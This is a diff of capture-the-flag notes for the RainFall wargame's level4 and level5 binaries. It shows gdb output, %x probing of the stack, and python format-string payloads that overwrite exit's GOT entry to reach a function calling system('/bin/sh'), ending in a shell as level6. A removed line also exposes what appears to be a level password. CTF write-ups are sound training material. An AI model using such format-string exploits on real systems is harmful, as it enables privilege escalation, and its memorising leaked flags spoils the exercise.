@@ -1,33 +1,52 @@
-```
-  char local_20c [520];
-  
-  fgets(local_20c,0x200,stdin);
-```
+we can see that we have a function o() that execute
+```  system("/bin/sh"); ```
 
-local_20c have a size of 520 but fgets let us only read 0x200 (512) char
+```
+(gdb) info functions
+All defined functions:
 
-level4@RainFall:~$ ./level4 
+Non-debugging symbols:
+0x08048334  _init
+0x08048380  printf
+0x08048380  printf@plt
+0x08048390  _exit
+0x08048390  _exit@plt
+0x080483a0  fgets
+0x080483a0  fgets@plt
+0x080483b0  system
+0x080483b0  system@plt
+0x080483c0  __gmon_start__
+0x080483c0  __gmon_start__@plt
+0x080483d0  exit
+0x080483d0  exit@plt
+0x080483e0  __libc_start_main
+0x080483e0  __libc_start_main@plt
+0x080483f0  _start
+0x08048420  __do_global_dtors_aux
+0x08048480  frame_dummy
+0x080484a4  o -> addresse of o in decimal 134513824 
+0x080484c2  n
+0x08048504  main```
+
+
+```
+level5@RainFall:~$ ./level5 
 AAAAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x 
-AAAAAA b7ff26b0 bffff784 b7fd0ff4 0 0 bffff748 804848d bffff540 200 b7fd1ac0 b7ff37d0 41414141 25204141 78252078 20782520 25207825 78252078 20782520
+AAAAAA 200 b7fd1ac0 b7ff37d0 41414141 25204141 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 
+```
+A is in 4th argument
 
-A is in 12nd argument
-
-
-python -c 'print "\x10\x98\x04\x08" + "%16930112c" + "%134513824$n"' > input.txt
-
-0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
-
-
-
+```
 *------------------
 (gdb) disas exit
 Dump of assembler code for function exit@plt:
    0x080483d0 <+0>:     jmp    *0x8049838
    0x080483d6 <+6>:     push   $0x28
    0x080483db <+11>:    jmp    0x8048370
+   ```
 
 python -c 'print "\x08\x04\x98\x38"[::-1] + "%134513824c" + "%4$n"' > input.txt
-
+cat input.txt - | ./level5 
                                                                           
   whoami
 level6
